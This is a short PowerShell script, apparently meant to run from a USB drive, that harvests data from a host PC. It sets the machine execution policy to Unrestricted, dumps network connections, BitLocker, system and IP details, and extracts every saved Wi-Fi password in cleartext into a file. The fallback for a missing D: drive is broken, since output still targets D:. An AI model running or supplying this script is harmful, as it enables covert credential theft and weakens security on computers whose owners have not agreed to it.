<# Quick powershell script to retrieve as much info from a host PC as possible #>

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
$time_now = Get-Date -format "HH:mm:ss"
$hn = hostname
$logs_path = "D:\$hn"

# This will run if no USB connected
if (Test-Path "D:\") {
    if (!(Test-Path $logs_path)) {
        New-Item -Path $logs_path -ItemType "directory"
    }
} else {
    $cwd = Get-Location
    New-Item -Path "$cwd\$hn" -ItemType "directory"
}
    
# Get netlogs
Get-NetTCPConnection | Out-File -FilePath $logs_path\netlogs.txt
Get-BitLockerVolume | Out-File -FilePath $logs_path\drives_info.txt
Get-ComputerInfo | Out-File -FilePath $logs_path\comp_info.txt
Get-NetIPAddress | Out-File -FilePath $logs_path\ips.txt

# Get LAN passwords
(netsh wlan show profiles) `
    | Select-String "\:(.+)$" `
    | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} `
    | %{(netsh wlan show profile name="$name" key=clear)}  `
    | Select-String "Key Content\W+\:(.+)$" `
    | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} `
    | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} `
    | Format-Table -AutoSize `
    | Out-File -FilePath $logs_path\pws.txt

